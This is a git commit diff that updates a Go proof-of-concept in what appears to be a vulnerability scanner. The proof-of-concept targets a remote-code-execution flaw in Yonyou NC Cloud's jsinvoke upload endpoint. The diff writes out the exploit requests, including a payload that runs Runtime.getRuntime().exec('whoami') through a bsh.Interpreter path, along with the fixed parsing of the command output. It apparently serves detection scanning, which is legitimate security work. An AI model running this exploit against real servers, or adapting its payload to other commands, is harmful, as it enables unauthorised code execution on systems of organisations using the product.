46782806ccff0361c77d6d2ced9972e2a62b2704
york-cmd <958913001@qq.com>
2023-07-24 12:04:16 +0800

    yongyou-nc-upload-rce-fix

--- pocs_go/yonyou/yonyou-nc-cloud-jsinvoke-upload-rce.go
+++ pocs_go/yonyou/yonyou-nc-cloud-jsinvoke-upload-rce.go
@@ -13,17 +13,21 @@ func Nc_cloud_jsinvoke_upload_rce(u string) bool {
 	var payload2 = "cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"whoami\").getInputStream())"
 	header := make(map[string]string)
 	header["Content-Type"] = "application/x-www-form-urlencoded"
-
+	//pkg.GoPocLog(re)
 	if req, err := pkg.HttpRequset(u+"/uapjs/jsinvoke/?action=invoke", "POST", payload, false, header); err == nil {
+		//pkg.GoPocLog(req.Status)
 		//pkg.GoPocLog(req.Body)
 		if req.StatusCode == 200 {
-			if req2, err := pkg.HttpRequset(u+"/404.jsp?error=bsh.Interpreter", "POST", payload2, false, nil); err == nil {
-				if req2.StatusCode == 200 && strings.Contains(req.Body, "<string>") && strings.Contains(req.Body, "version") {
+			if req2, err := pkg.HttpRequset(u+"/404.jsp?error=bsh.Interpreter", "POST", payload2, false, header); err == nil {
+				//pkg.GoPocLog(r)
+				//pkg.GoPocLog(req.Status)
+				//pkg.GoPocLog(req2.Body)
+				if req2.StatusCode == 200 && strings.Contains(req2.Body, "<string>") && strings.Contains(req2.Body, "version") {
 					str := req2.Body
-					var pattern = `<string>(.*?)</string>`
+					var pattern = `<string>(.*?)\n</string>`
 					re := regexp.MustCompile(pattern)
-					resourceUuid := re.FindStringSubmatch(str)
-					pkg.GoPocLog(fmt.Sprintf("Found may be vuln Nc_cloud_jsinvoke_upload_rce |%s |whomi结果：%s\n", u+"/404.jsp?error=bsh.Interpreter", resourceUuid))
+					resourceUuid := re.FindStringSubmatch(str)[1]
+					pkg.GoPocLog(fmt.Sprintf("Found  vuln Nc_cloud_jsinvoke_upload_rce |%s |whomi结果：%s\n", u+"/404.jsp?error=bsh.Interpreter", resourceUuid))
 					return true
 				}
 			}
